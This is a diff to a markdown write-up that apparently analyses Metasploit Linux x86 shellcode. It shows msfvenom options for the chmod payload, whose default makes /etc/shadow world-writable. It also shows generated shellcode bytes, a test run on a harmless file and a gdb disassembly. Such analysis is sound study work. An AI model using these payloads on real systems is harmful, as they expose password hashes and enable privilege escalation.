@@ -90,7 +90,7 @@ So as you can see, a new user with the username ```metasploit``` is added. Let's
 
 ### Analysis
 Let's take this into ```gdb``` and disassemble the code:
-```
+```nasm
 Breakpoint 1, 0x00404040 in code ()
 gdb-peda$ disas
 Dump of assembler code for function code:
@@ -307,3 +307,82 @@ Then finally, the ```exit()``` function is called, with the syscall number ```0x
 
 ## Shellcode 2: linux/x86/chmod ##
 Now let's have a look at a ```chmod``` shellcode. This shellcode helps in changing the permissions of a particular file, when supplied with a desired mode. Let's look at the basic options:
+```
+$ msfvenom -p linux/x86/chmod --list-options                                      
+Options for payload/linux/x86/chmod:
+=========================
+
+
+       Name: Linux Chmod
+     Module: payload/linux/x86/chmod
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 36
+       Rank: Normal
+
+Provided by:
+    kris katterjohn <katterjohn@gmail.com>
+
+Basic options:
+Name  Current Setting  Required  Description
+----  ---------------  --------  -----------
+FILE  /etc/shadow      yes       Filename to chmod
+MODE  0666             yes       File mode (octal)
+
+Description:
+  Runs chmod on specified file with specified mode
+```
+So the payload appears to be taking two arguments, the filename and the desired mode in octal. Let's generate some test shellcode and check it out:
+```
+$ msfvenom -p linux/x86/chmod FILE=test.txt -f c          
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 33 bytes
+Final size of c file: 165 bytes
+unsigned char buf[] =
+"\x99\x6a\x0f\x58\x52\xe8\x09\x00\x00\x00\x74\x65\x73\x74\x2e"
+"\x74\x78\x74\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01"
+"\x58\xcd\x80";
+
+paste in shellcode.c, compile
+$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+shellcode.c:8:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
+    8 | main()
+      | ^~~~
+
+before running:
+$ ls -la | grep test.txt
+-rw-r--r-- 1 kali kali     6 Jun 27 19:24 test.txt
+$ ./shellcode
+Shellcode Length:  7
+$ ls -la | grep test.txt
+-rw-rw-rw- 1 kali kali     6 Jun 27 19:24 test.txt
+```
+As you can see, the permissions have been changed to read and write for all users and groups, which basically translates to a ```chmod 666``` command. Now, let's understand how this works.
+
+### Analysis
+Let's take this into ```gdb``` and obtain a disassembly:
+```nasm
+gdb-peda$ disas
+Dump of assembler code for function code:
+=> 0x00404040 <+0>:     cdq    
+   0x00404041 <+1>:     push   0xf
+   0x00404043 <+3>:     pop    eax
+   0x00404044 <+4>:     push   edx
+   0x00404045 <+5>:     call   0x404053 <code+19>
+   0x0040404a <+10>:    je     0x4040b1
+   0x0040404c <+12>:    jae    0x4040c2
+   0x0040404e <+14>:    cs je  0x4040c9
+   0x00404051 <+17>:    je     0x404053 <code+19>
+   0x00404053 <+19>:    pop    ebx
+   0x00404054 <+20>:    push   0x1b6
+   0x00404059 <+25>:    pop    ecx
+   0x0040405a <+26>:    int    0x80
+   0x0040405c <+28>:    push   0x1
+   0x0040405e <+30>:    pop    eax
+   0x0040405f <+31>:    int    0x80
+   0x00404061 <+33>:    add    BYTE PTR [eax],al
+End of assembler dump.
+```
